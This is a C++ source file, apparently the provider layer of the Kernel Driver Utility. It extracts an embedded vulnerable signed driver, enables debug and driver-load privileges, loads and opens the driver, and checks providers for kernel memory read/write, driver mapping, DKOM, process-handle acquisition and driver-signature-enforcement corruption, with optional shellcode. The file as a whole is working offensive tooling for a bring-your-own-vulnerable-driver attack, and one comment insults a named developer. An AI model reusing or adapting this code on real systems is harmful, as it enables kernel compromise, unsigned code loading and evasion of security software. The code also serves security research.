/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2026
*
*  TITLE:       KDUPROV.CPP
*
*  VERSION:     1.49
*
*  DATE:        06 Jun 2026
*
*  Vulnerable drivers provider abstraction layer.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "provdb.h"
#include "kduplist.h"
#include "hvdetect.h"
#include "envdetect.h"
#include "provlist.h"

PKDU_DB gProvTable = NULL;
static KDU_DB_SOURCE_TYPE g_KduDbSource = KduDbSourceAuto;
static HINSTANCE g_KduDbModule = NULL;

PKDU_DB_ENTRY KDUProviderToDbEntry(
    _In_ ULONG ProviderId)
{
    if (gProvTable == NULL)
        return NULL;

    ULONG i;

    for (i = 0; i < gProvTable->NumberOfEntries; i++) {
        if (gProvTable->Entries[i].ProviderId == ProviderId)
            return &gProvTable->Entries[i];
    }

    return NULL;
}

/*
* KDUFirmwareToString
*
* Purpose:
*
* Return human readable firmware name.
*
*/
LPCSTR KDUFirmwareToString(
    _In_ FIRMWARE_TYPE Firmware)
{
    switch (Firmware) {
    case FirmwareTypeBios:
        return "FirmwareTypeBios";
    case FirmwareTypeUefi:
        return "FirmwareTypeUefi";
    case FirmwareTypeUnknown:
    default:
        return "FirmwareTypeUnknown";
    }
}

/*
* KDUProvGetActiveDbCount
*
* Purpose:
*
* Return count of providers in the active database.
*
*/
ULONG KDUProvGetActiveDbCount()
{
    if (gProvTable)
        return gProvTable->NumberOfEntries;

    return 0;
}

/*
* KDUProvGetCount
*
* Purpose:
*
* Return count of available providers.
*
*/
ULONG KDUProvGetCount()
{
    return RTL_NUMBER_OF(g_KDUProviders);
}

/*
* KDUProviderSetDbSource
*
* Purpose:
*
* Set preferred providers database source.
*
*/
VOID KDUProviderSetDbSource(
    _In_ KDU_DB_SOURCE_TYPE DbSource
)
{
    g_KduDbSource = DbSource;
}

/*
* KDUProviderGetDbSource
*
* Purpose:
*
* Return current preferred providers database source.
*
*/
KDU_DB_SOURCE_TYPE KDUProviderGetDbSource(
    VOID
)
{
    return g_KduDbSource;
}

/*
* KDUReferenceLoadDB
*
* Purpose:
*
* Return pointer to KDU database.
*
*/
PKDU_DB KDUReferenceLoadDB()
{
    return gProvTable;
}

/*
* KDUProvExtractVulnerableDriver
*
* Purpose:
*
* Extract vulnerable driver from resource.
*
*/
BOOL KDUProvExtractVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    NTSTATUS ntStatus;
    ULONG    resourceSize = 0, writeBytes;
    ULONG    uResourceId = Context->Provider->LoadData->ResourceId;
    LPWSTR   lpFullFileName = Context->DriverFileName;
    PBYTE    drvBuffer;

    //
    // Extract driver resource to the file.
    //
    drvBuffer = (PBYTE)KDULoadResource(uResourceId,
        Context->ModuleBase,
        &resourceSize,
        PROVIDER_RES_KEY,
        Context->Provider->LoadData->IgnoreChecksum ? FALSE : TRUE);

    if (drvBuffer == NULL) {

        supPrintfEvent(kduEventError,
            "[!] Driver resource id cannot be found %lu\r\n", uResourceId);

        return FALSE;
    }

    printf_s("[+] Extracting vulnerable driver as \"%ws\"\r\n", lpFullFileName);

    writeBytes = (ULONG)supWriteBufferToFile(lpFullFileName,
        drvBuffer,
        resourceSize,
        TRUE,
        FALSE,
        &ntStatus);

    supHeapFree(drvBuffer);

    if (resourceSize != writeBytes) {
        supShowHardError("[!] Unable to extract vulnerable driver", ntStatus);
        return FALSE;
    }

    return TRUE;
}

/*
* KDUProvLoadVulnerableDriver
*
* Purpose:
*
* Load provider vulnerable driver.
*
*/
BOOL KDUProvLoadVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL     bLoaded = FALSE;
    NTSTATUS ntStatus;

    LPWSTR   lpFullFileName = Context->DriverFileName;
    LPWSTR   lpDriverName = Context->Provider->LoadData->DriverName;


    if (!KDUProvExtractVulnerableDriver(Context))
        return FALSE;

    //
    // Load driver.
    //
    ntStatus = supLoadDriver(lpDriverName, lpFullFileName, FALSE);
    if (NT_SUCCESS(ntStatus)) {
        supPrintfEvent(kduEventInformation,
            "[+] Vulnerable driver \"%ws\" loaded\r\n", lpDriverName);
        bLoaded = TRUE;
    }
    else {

        supShowHardError("[!] Unable to load vulnerable driver", ntStatus);
        DeleteFile(lpFullFileName);
    }

    return bLoaded;
}

/*
* KDUProvIsAlreadyLoaded
*
* Purpose:
*
* Check if provider driver is already loaded by presence of it device object.
*
*/
BOOL KDUProvIsAlreadyLoaded(
    _In_ KDU_CONTEXT* Context
)
{
    LPWSTR lpRootDirectory;
    LPWSTR lpDeviceName = Context->Provider->LoadData->DeviceName;

    switch (Context->Provider->LoadData->ProviderId) {
    case KDU_PROVIDER_DELL_PCDOC:
        lpRootDirectory = (LPWSTR)L"\\GLOBAL??";
        break;
    default:
        lpRootDirectory = (LPWSTR)L"\\Device";
        break;
    }
    return supIsObjectExists(lpRootDirectory, lpDeviceName);
}

/*
* KDUProvStartVulnerableDriver
*
* Purpose:
*
* Load vulnerable driver and return handle for it device or NULL in case of error.
*
*/
BOOL KDUProvStartVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL bLoaded = FALSE;

    //
    // Check if driver already loaded.
    //
    if (KDUProvIsAlreadyLoaded(Context)) {

        supPrintfEvent(kduEventError,
            "[!] Vulnerable driver is already loaded\r\n");

        bLoaded = TRUE;
    }
    else {

        //
        // Driver is not loaded, load it.
        //
        bLoaded = KDUProvLoadVulnerableDriver(Context);

    }

    //
    // If driver loaded then open handle for it and run optional callbacks.
    //
    if (bLoaded) {
        KDUProvOpenVulnerableDriverAndRunCallbacks(Context);
    }

    return (Context->DeviceHandle != NULL);
}

/*
* KDUProvOpenVulnerableDriverAndRunCallbacks
*
* Purpose:
*
* Open handle for vulnerable driver and run optional callbacks if they are defined.
*
*/
void KDUProvOpenVulnerableDriverAndRunCallbacks(
    _In_ KDU_CONTEXT* Context
)
{
    HANDLE deviceHandle = NULL;

    //
    // Run pre-open callback (optional).
    //
    if (Context->Provider->Callbacks.PreOpenDriver) {
        printf_s("[+] Executing pre-open callback for given provider\r\n");
        Context->Provider->Callbacks.PreOpenDriver((PVOID)Context);
    }

    NTSTATUS ntStatus = supOpenDriver(Context->Provider->LoadData->DeviceName,
        SYNCHRONIZE | WRITE_DAC | GENERIC_WRITE | GENERIC_READ,
        &deviceHandle);

    if (!NT_SUCCESS(ntStatus)) {

        supShowHardError("[!] Unable to open vulnerable driver", ntStatus);

    }
    else {

        //
        // Log the actual device object name being opened to avoid confusion with service/driver name.
        //
        supPrintfEvent(kduEventInformation,
            "[+] Driver device \"%ws\" has been opened successfully\r\n",
            Context->Provider->LoadData->DeviceName);

        Context->DeviceHandle = deviceHandle;

        //
        // Run post-open callback (optional).
        //
        if (Context->Provider->Callbacks.PostOpenDriver) {

            printf_s("[+] Executing post-open callback for given provider\r\n");

            Context->Provider->Callbacks.PostOpenDriver((PVOID)Context);

        }

    }
}

/*
* KDUProvStopVulnerableDriver
*
* Purpose:
*
* Unload previously loaded vulnerable driver.
*
*/
void KDUProvStopVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    NTSTATUS ntStatus;
    LPWSTR lpDriverName = Context->Provider->LoadData->DriverName;
    LPWSTR lpFullFileName = Context->DriverFileName;

    ntStatus = supUnloadDriver(lpDriverName, TRUE);
    if (!NT_SUCCESS(ntStatus)) {

        supShowHardError("[!] Unable to unload vulnerable driver", ntStatus);

    }
    else {

        supPrintfEvent(kduEventInformation,
            "[+] Vulnerable driver \"%ws\" unloaded\r\n",
            lpDriverName);

        if (supDeleteFileWithWait(1000, 5, lpFullFileName))
            printf_s("[+] Vulnerable driver file removed\r\n");

        Context->ProviderState = StateUnloaded;

    }
}

/*
* KDUProviderPostOpen
*
* Purpose:
*
* Provider post-open driver generic callback.
*
*/
BOOL WINAPI KDUProviderPostOpen(
    _In_ PVOID Param
)
{
    KDU_CONTEXT* Context = (KDU_CONTEXT*)Param;
    PSECURITY_DESCRIPTOR driverSD = NULL;

    PACL defaultAcl = NULL;
    HANDLE deviceHandle;

    deviceHandle = Context->DeviceHandle;

    //
    // Check if we need to forcebly set SD.
    //
    if (Context->Provider->LoadData->NoForcedSD == FALSE) {

        //
        // At least make less mess.
        // However if driver author is an idiot just like Unwinder, it won't much help.
        //
        NTSTATUS ntStatus;

        ntStatus = supCreateSystemAdminAccessSD(&driverSD, &defaultAcl);

        if (NT_SUCCESS(ntStatus)) {

            ntStatus = NtSetSecurityObject(deviceHandle,
                DACL_SECURITY_INFORMATION,
                driverSD);

            if (!NT_SUCCESS(ntStatus)) {

                supShowHardError("[!] Unable to set driver device security descriptor", ntStatus);

            }
            else {
                printf_s("[+] Driver device security descriptor set successfully\r\n");
            }

            if (defaultAcl) supHeapFree(defaultAcl);
            supHeapFree(driverSD);

        }
        else {

            supShowHardError("[!] Unable to allocate security descriptor", ntStatus);

        }

    }

    //
    // Remove WRITE_DAC from result handle.
    //
    HANDLE strHandle = NULL;
    NTSTATUS ntStatus;

    ntStatus = NtDuplicateObject(NtCurrentProcess(),
        deviceHandle,
        NtCurrentProcess(),
        &strHandle,
        SYNCHRONIZE | GENERIC_WRITE | GENERIC_READ,
        0,
        0);

    if (NT_SUCCESS(ntStatus)) {
        NtClose(deviceHandle);
        deviceHandle = strHandle;
    }
    else {
        supShowHardError("[!] Unable to narrow driver device handle access", ntStatus);
    }

    Context->DeviceHandle = deviceHandle;

    return (deviceHandle != NULL);
}


/*
* KDUOpenProcess
*
* Purpose:
*
* Provider wrapper for OpenProcess routine.
*
*/
_Success_(return != FALSE)
BOOL WINAPI KDUOpenProcess(
    _In_ struct _KDU_CONTEXT* Context,
    _In_ HANDLE ProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle
)
{
    BOOL bResult = FALSE;
    KDU_PROVIDER* prov = Context->Provider;

    __try {

        bResult = prov->Callbacks.OpenProcess(Context->DeviceHandle,
            ProcessId,
            DesiredAccess,
            ProcessHandle);

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        SetLastError(GetExceptionCode());
        return FALSE;
    }
    return bResult;
}

/*
* KDUProviderValidateDb
*
* Purpose:
*
* Validate providers database version and table.
*
*/
static BOOL KDUProviderValidateDb(
    _In_ LPCSTR DbName,
    _In_ KDU_DB_VERSION * VersionInfo,
    _In_ PKDU_DB ProviderTable
)
{
    if (VersionInfo == NULL) {
        supPrintfEvent(kduEventError,
            "[!] %s version data not found\r\n",
            DbName);
        return FALSE;
    }

    if (VersionInfo->MajorVersion != KDU_VERSION_MAJOR ||
        VersionInfo->MinorVersion != KDU_VERSION_MINOR ||
        VersionInfo->Revision != KDU_VERSION_REVISION ||
        VersionInfo->Build != KDU_VERSION_BUILD)
    {
        supPrintfEvent(kduEventError,
            "[!] %s has wrong version, expected %lu.%lu.%lu.%lu, got %lu.%lu.%lu.%lu\r\n",
            DbName,
            KDU_VERSION_MAJOR,
            KDU_VERSION_MINOR,
            KDU_VERSION_REVISION,
            KDU_VERSION_BUILD,
            VersionInfo->MajorVersion,
            VersionInfo->MinorVersion,
            VersionInfo->Revision,
            VersionInfo->Build);

        return FALSE;
    }

    if (ProviderTable == NULL || ProviderTable->Entries == NULL || ProviderTable->NumberOfEntries == 0) {
        supPrintfEvent(kduEventError,
            "[!] %s table is invalid\r\n",
            DbName);
        return FALSE;
    }

    printf_s("[+] Database %s version is OK\r\n", DbName);

    return TRUE;
}

/*
* KDUProviderLoadExternalDb
*
* Purpose:
*
* Load providers database from external drv64.dll.
*
*/
static HINSTANCE KDUProviderLoadExternalDb(
    _Out_ PKDU_DB * ProviderTable
)
{
    HINSTANCE hInstance;
    KDU_DB_VERSION* pVersionInfo;
    PKDU_DB pTable;

    *ProviderTable = NULL;

    SetDllDirectory(NULL);
    hInstance = LoadLibraryEx(DRV64DLL, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (hInstance == NULL)
        return NULL;

    printf_s("[+] Drivers database \"%ws\" loaded at 0x%p\r\n", DRV64DLL, hInstance);

    pVersionInfo = (KDU_DB_VERSION*)GetProcAddress(hInstance, "gVersion");
    pTable = (PKDU_DB)GetProcAddress(hInstance, "gProvTable");

    if (!KDUProviderValidateDb("KDUEXT", pVersionInfo, pTable)) {
        FreeLibrary(hInstance);
        return NULL;
    }

    *ProviderTable = pTable;
    return hInstance;
}

/*
* KDUProviderLoadEmbeddedDb
*
* Purpose:
*
* Initialize providers database from Hamakaze embedded data.
*
*/
static HINSTANCE KDUProviderLoadEmbeddedDb(
    _Out_ PKDU_DB * ProviderTable
)
{
    HINSTANCE hInstance;

    *ProviderTable = NULL;
    hInstance = GetModuleHandle(NULL);

    if (!KDUProviderValidateDb("KDUEMB",
        &gVersionEmbedded,
        &gProvTableEmbedded))
    {
        return NULL;
    }

    printf_s("[+] Embedded drivers database selected, module 0x%p\r\n", hInstance);

    *ProviderTable = &gProvTableEmbedded;
    return hInstance;
}

/*
* KDUProviderLoadDB
*
* Purpose:
*
* Load drivers database file or use embedded providers database.
*
*/
HINSTANCE KDUProviderLoadDB(
    VOID
)
{
    HINSTANCE hInstance;
    PKDU_DB providerTable;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    hInstance = NULL;
    providerTable = NULL;

    do {

        if (g_KduDbModule != NULL && gProvTable != NULL) {
            hInstance = g_KduDbModule;
            break;
        }

        switch (g_KduDbSource) {

        case KduDbSourceExternalDll:

            hInstance = KDUProviderLoadExternalDb(&providerTable);
            break;

        case KduDbSourceEmbedded:

            hInstance = KDUProviderLoadEmbeddedDb(&providerTable);
            break;

        case KduDbSourceAuto:
        default:

            hInstance = KDUProviderLoadExternalDb(&providerTable);
            if (hInstance == NULL) {
                // Fall back to embedded providers database when external DLL is unavailable.
                hInstance = KDUProviderLoadEmbeddedDb(&providerTable);
            }
            break;
        }

        if (hInstance == NULL || providerTable == NULL) {
            if (g_KduDbSource == KduDbSourceExternalDll) {
                supShowWin32Error("[!] Cannot load drivers database", GetLastError());
            }
            hInstance = NULL;
            break;
        }

        g_KduDbModule = hInstance;
        gProvTable = providerTable;

    } while (FALSE);

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return hInstance;
}

BOOL KDUpRwHandlersAreSet(
    _In_opt_ PVOID ReadHandler,
    _In_opt_ PVOID WriteHandler
)
{
    if (ReadHandler == NULL ||
        WriteHandler == NULL)
    {

        supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support arbitrary kernel read/write or\r\n"\
            "\tKDU interface is not implemented for these methods.\r\n");

        return FALSE;

    }

    return TRUE;
}

/*
* KDUProviderVerifyActionType
*
* Purpose:
*
* Verify key provider functionality.
*
*/
BOOL KDUProviderVerifyActionType(
    _In_ KDU_PROVIDER * Provider,
    _In_ KDU_ACTION_TYPE ActionType)
{
    BOOL bResult = TRUE;

#ifdef _DEBUG
    DbgPrint("KDUProviderVerifyActionType bypassed\r\n");
    return TRUE;
#endif

    //
    // Check mixed settings.
    //
    if (Provider->LoadData->PreferPhysical && Provider->LoadData->PreferVirtual) {
        supPrintfEvent(kduEventError,
            "[!] Abort: provider flags PreferPhysical and PreferVirtual cannot be combined\r\n");
        return FALSE;
    }

    // 1st check the relevant primitives
    switch (ActionType) {

    case ActionTypeOpenProcessHandle:

        if (Provider->Callbacks.OpenProcess == NULL)
        {
            supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support arbitrary process handle acquisition or\r\n"\
                "\tKDU interface is not implemented for this method.\r\n");
            return FALSE;

        }

        break; 
        // in case the access rights need to be modified, -pho also needs to have read/write
        // but I guess it's better to fail when r/w is required later, then to fail here when r/w would maybe not be required

    case ActionTypeDKOM:
    case ActionTypeMapDriver:
    case ActionTypeDSECorruption:

        //
        // Check if we can translate.
        //
        if (Provider->LoadData->PML4FromLowStub && Provider->Callbacks.VirtualToPhysical == NULL) {

            supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support memory translation or\r\n"\
                "\tKDU interface is not implemented for these methods.\r\n");

            return FALSE;
        }

        if (Provider->LoadData->PreferPhysical || Provider->LoadData->PhysMemoryBruteForce) {

            //
            // Driver must have at least something defined.
            //
            BOOL bFirstTry = TRUE, bSecondTry = TRUE;

            if (Provider->Callbacks.ReadPhysicalMemory == NULL ||
                Provider->Callbacks.WritePhysicalMemory == NULL)
            {
                bFirstTry = FALSE;
            }

            if (Provider->Callbacks.ReadKernelVM == NULL ||
                Provider->Callbacks.WriteKernelVM == NULL)
            {
                bSecondTry = FALSE;
            }

            if (bFirstTry == FALSE && bSecondTry == FALSE) {
                supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support arbitrary kernel read/write or\r\n"\
                    "\tKDU interface is not implemented for these methods.\r\n");
                return FALSE;
            }

        }

        break;

    case ActionTypeDumpProcess:

        if (Provider->Callbacks.OpenProcess == NULL) {

            supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support arbitrary process handle acquisition or\r\n"\
                "\tKDU interface is not implemented for this method.\r\n");
            return FALSE;

        }

        break;

    default:
        break;
    }

    // 2nd set callbacks
    switch (ActionType) {

    case ActionTypeDKOM:

        //
        // Check if we can read/write.
        //

        if (Provider->LoadData->PreferPhysical) {

            if (!KDUpRwHandlersAreSet(
                (PVOID)Provider->Callbacks.ReadPhysicalMemory,
                (PVOID)Provider->Callbacks.WritePhysicalMemory))
            {
                bResult = FALSE;
            }

        }
        else {

            if (!KDUpRwHandlersAreSet(
                (PVOID)Provider->Callbacks.ReadKernelVM,
                (PVOID)Provider->Callbacks.WriteKernelVM))
            {
                bResult = FALSE;
            }

        }

        break;

    case ActionTypeMapDriver:

        //
        // Check if we can map.
        //
        if (Provider->Callbacks.MapDriver == NULL) {

            supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support driver mapping or\r\n"\
                "\tKDU interface is not implemented for these methods.\r\n");

            bResult = FALSE;

        }

        break;

    case ActionTypeDSECorruption:

        //
        // Check if we have DSE control callback set.
        //
        if ((PVOID)Provider->Callbacks.ControlDSE == NULL) {

            supPrintfEvent(kduEventError,
                "[!] Abort: selected provider does not support changing DSE values or\r\n"\
                "\tKDU interface is not implemented for this method.\r\n");

            bResult = FALSE;

        }
        break;

    default:
        break;
    }

    return bResult;
}

VOID KDUFallBackOnLoad(
    _Inout_ PKDU_CONTEXT * Context
)
{
    PKDU_CONTEXT ctx = *Context;

    if (ctx->DeviceHandle)
        NtClose(ctx->DeviceHandle);

    if (ctx->Provider->Callbacks.StopVulnerableDriver)
        ctx->Provider->Callbacks.StopVulnerableDriver(ctx);

    if (ctx->DriverFileName)
        supHeapFree(ctx->DriverFileName);

    supHeapFree(ctx);
    *Context = NULL;
}

BOOL KDUIsSupportedShell(
    _In_ ULONG ShellCodeVersion,
    _In_ ULONG ProviderFlags)
{
    ULONG value;
    switch (ShellCodeVersion) {
    case KDU_SHELLCODE_V1:
        value = KDUPROV_SC_V1;
        break;
    case KDU_SHELLCODE_V2:
        value = KDUPROV_SC_V2;
        break;
    case KDU_SHELLCODE_V3:
        value = KDUPROV_SC_V3;
        break;
    case KDU_SHELLCODE_V4:
        value = KDUPROV_SC_V4;
        break;
    default:
        return FALSE;
    }

    return ((ProviderFlags & value) > 0);
}

/*
* KDUProviderCreate
*
* Purpose:
*
* Create Provider to work with it.
*
*/
PKDU_CONTEXT WINAPI KDUProviderCreate(
    _In_ ULONG ProviderId,
    _In_ ULONG HvciEnabled,
    _In_ ULONG NtBuildNumber,
    _In_ ULONG ShellCodeVersion,
    _In_ KDU_ACTION_TYPE ActionType
)
{
    ULONG victimId;
    HINSTANCE moduleBase;
    KDU_CONTEXT* Context = NULL;
    KDU_DB_ENTRY* provLoadData = NULL;
    KDU_PROVIDER* prov;
    NTSTATUS ntStatus;

    FIRMWARE_TYPE fmwType;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    do {

        //
        // Check Hypervisor presence.
        //
        KDUDetectHypervisor();

        //
        // Check environment.
        //
        KDUDetectEnvironment();

        //
        // Load drivers DB.
        //
        moduleBase = KDUProviderLoadDB();
        if (moduleBase == NULL) {
            break;
        }

        //
        // Load provider data.
        //
        provLoadData = KDUProviderToDbEntry(ProviderId);
        if (provLoadData == NULL) {
            if (ProviderId != KDU_PROVIDER_DEFAULT) {
                supPrintfEvent(kduEventInformation,
                    "[+] Provider with id %lu was not found in active database, will be using default provider (0)\r\n",
                    ProviderId);

                ProviderId = KDU_PROVIDER_DEFAULT;
                provLoadData = KDUProviderToDbEntry(ProviderId);
            }

            if (provLoadData == NULL) {
                supPrintfEvent(kduEventError,
                    "[!] Requested provider data was not found in database, abort\r\n");
                break;
            }
        }

        prov = &g_KDUProviders[ProviderId];
        prov->LoadData = provLoadData;

        if (ShellCodeVersion != KDU_SHELLCODE_NONE) {
            if (!KDUIsSupportedShell(ShellCodeVersion, provLoadData->SupportedShellFlags)) {
                supPrintfEvent(kduEventError,
                    "[!] Selected shellcode %lu is not supported by this provider (supported mask: 0x%08x), abort\r\n",
                    ShellCodeVersion, provLoadData->SupportedShellFlags);
                break;
            }
        }

        ntStatus = supGetFirmwareType(&fmwType);
        if (!NT_SUCCESS(ntStatus)) {
            supShowHardError("[!] Failed to query firmware type", ntStatus);
        }
        else {

            supPrintfEvent(kduEventNone, "[+] Firmware type (%s)\r\n",
                KDUFirmwareToString(fmwType));
            /*
            if (provLoadData->PML4FromLowStub)
                if (fmwType != FirmwareTypeUefi) {

                    supPrintfEvent(kduEventError, "[!] Unsupported PC firmware type for this provider (req: %s, got: %s)\r\n",
                        KDUFirmwareToString(FirmwareTypeUefi),
                        KDUFirmwareToString(fmwType));

                    break;
                }
            */
        }

        //
        // Show provider info.
        //
        supPrintfEvent(kduEventInformation, "[+] Provider: \"%ws\", Name \"%ws\"\r\n",
            provLoadData->Description,
            provLoadData->DriverName);

        //
        // Check HVCI support.
        //
        if (HvciEnabled && provLoadData->SupportHVCI == 0) {

            supPrintfEvent(kduEventError,
                "[!] Abort: selected provider does not support HVCI\r\n");

            break;
        }

        //
        // Check current Windows NT build number.
        //

        if (NtBuildNumber < provLoadData->MinNtBuildNumberSupport) {

            supPrintfEvent(kduEventError,
                "[!] Abort: selected provider require newer Windows NT version\r\n");

            break;
        }

        //
        // Let it burn if they want.
        //

        if (provLoadData->MaxNtBuildNumberSupport != KDU_MAX_NTBUILDNUMBER) {
            if (NtBuildNumber > provLoadData->MaxNtBuildNumberSupport) {

                supPrintfEvent(kduEventError,
                    "[!] Warning: selected provider may not work on this Windows NT version\r\n");

            }
        }

        if (!KDUProviderVerifyActionType(prov, ActionType))
            break;

        ntStatus = supEnablePrivilege(SE_DEBUG_PRIVILEGE, TRUE);
        if (!NT_SUCCESS(ntStatus)) {
            supShowHardError("[!] Abort: SeDebugPrivilege is not assigned!", ntStatus);
            break;
        }

        ntStatus = supEnablePrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE);
        if (!NT_SUCCESS(ntStatus)) {
            supShowHardError("[!] Abort: SeLoadDriverPrivilege is not assigned!", ntStatus);
            break;
        }

        if (provLoadData->UseSymbols) {
            if (!symInit()) {
                break;
            }
        }

        //
        // Allocate KDU_CONTEXT structure and fill it with data.
        //
        Context = (KDU_CONTEXT*)supHeapAlloc(sizeof(KDU_CONTEXT));
        if (Context == NULL) {

            supPrintfEvent(kduEventError,
                "[!] Abort: could not allocate provider context\r\n");

            break;
        }

        Context->Provider = prov;

        if (Context->Provider->Callbacks.ValidatePrerequisites)
            if (!Context->Provider->Callbacks.ValidatePrerequisites(Context))
            {
                supHeapFree(Context);
                Context = NULL;

                supPrintfEvent(kduEventError,
                    "[!] Abort: provider prerequisites are not meet\r\n");

                break;
            }

        if (provLoadData->NoVictim) {
            Context->Victim = NULL;
        }
        else {
            victimId = prov->LoadData->VictimId;
            if (victimId >= KDU_VICTIM_MAX)
                victimId = KDU_VICTIM_DEFAULT;

            Context->Victim = &g_KDUVictims[victimId];
        }

        PUNICODE_STRING CurrentDirectory = &NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath;
        SIZE_T length = 64 +
            (_strlen(provLoadData->DriverName) * sizeof(WCHAR)) +
            CurrentDirectory->Length;

        Context->DriverFileName = (LPWSTR)supHeapAlloc(length);
        if (Context->DriverFileName == NULL) {
            supHeapFree(Context);
            Context = NULL;
        }
        else {

            Context->ShellVersion = ShellCodeVersion;
            Context->NtBuildNumber = NtBuildNumber;
            Context->ModuleBase = moduleBase;
            Context->NtOsBase = supGetNtOsBase();
            Context->MaximumUserModeAddress = supQueryMaximumUserModeAddress();
            Context->MemoryTag = supSelectNonPagedPoolTag();

            length = CurrentDirectory->Length / sizeof(WCHAR);

            _strncpy(Context->DriverFileName,
                length,
                CurrentDirectory->Buffer,
                length);

            _strcat(Context->DriverFileName, TEXT("\\"));
            _strcat(Context->DriverFileName, provLoadData->DriverName);
            _strcat(Context->DriverFileName, TEXT(".sys"));

            if (Context->Provider->Callbacks.StartVulnerableDriver(Context)) {

                Context->ProviderState = StateLoaded;

                //
                // Register (unlock, send love letter, whatever this provider want first) driver.
                //
                if ((PVOID)Context->Provider->Callbacks.RegisterDriver) {

                    PVOID regParam;

                    if (provLoadData->NoVictim) {
                        regParam = (PVOID)Context;
                    }
                    else {
                        regParam = UlongToPtr(provLoadData->ResourceId);
                    }

                    if (!Context->Provider->Callbacks.RegisterDriver(
                        Context->DeviceHandle,
                        regParam))
                    {

                        supShowWin32Error("[!] Cannot register provider driver", GetLastError());

                        //
                        // This is hard error for some providers, abort execution.
                        //
                        KDUFallBackOnLoad(&Context);

                    }
                }

            }
            else {
                supHeapFree(Context->DriverFileName);
                supHeapFree(Context);
                Context = NULL;
            }

        }

    } while (FALSE);

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return Context;
}

/*
* KDUProviderRelease
*
* Purpose:
*
* Release Provider context, free resources and unload driver.
*
*/
VOID WINAPI KDUProviderRelease(
    _In_ KDU_CONTEXT * Context)
{
    FUNCTION_ENTER_MSG(__FUNCTION__);

    if (Context) {

        if (Context->ProviderState == StateLoaded) {

            //
            // Unregister driver if supported.
            //
            if ((PVOID)Context->Provider->Callbacks.UnregisterDriver) {
                Context->Provider->Callbacks.UnregisterDriver(
                    Context->DeviceHandle,
                    (PVOID)Context);
            }

            if (Context->DeviceHandle) {
                NtClose(Context->DeviceHandle);
                Context->DeviceHandle = NULL;
            }

            if (Context->Provider->LoadData->NoUnloadSupported) {
                supPrintfEvent(kduEventInformation,
                    "[~] This driver does not support unload procedure, reboot PC to get rid of it\r\n");
            }
            else {

                //
                // Unload driver.
                //
                Context->Provider->Callbacks.StopVulnerableDriver(Context);

            }

            Context->ProviderState = StateUnloaded;
        }

        if (Context->DriverFileName) {
            supHeapFree(Context->DriverFileName);
            Context->DriverFileName = NULL;
        }

        //
        // Free provider specific globals.
        //
        if (Context->Provider->LoadData->UseSuperfetch)
            supFreeSuperfetchMemoryMapCache();

        supHeapFree(Context);
    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);
}

/*
* KDUValidatePrerequisitesForSuperfetch
*
* Purpose:
*
* Enable privilege for superfetch aware provider.
*
*/
BOOL WINAPI KDUValidatePrerequisitesForSuperfetch(
    _In_ PKDU_CONTEXT Context)
{
    BOOLEAN oldValue = FALSE;
    NTSTATUS ntStatus;

    //
    // Only for superfetch aware providers.
    //
    if (Context->Provider->LoadData->UseSuperfetch) {

        //
        // Only enable privilege, defer map building.
        //
        ntStatus = RtlAdjustPrivilege(SE_PROF_SINGLE_PROCESS_PRIVILEGE, TRUE, FALSE, &oldValue);
        if (!NT_SUCCESS(ntStatus)) {
            supPrintfEvent(kduEventError,
                "[-] Failed to enable SE_PROF_SINGLE_PROCESS_PRIVILEGE (0x%lX)\r\n", ntStatus);
            return FALSE;
        }

        supPrintfEvent(kduEventInformation,
            "[+] Superfetch prerequisites validated, SE_PROF_SINGLE_PROCESS_PRIVILEGE adjusted\r\n");

    }
    return TRUE;
}
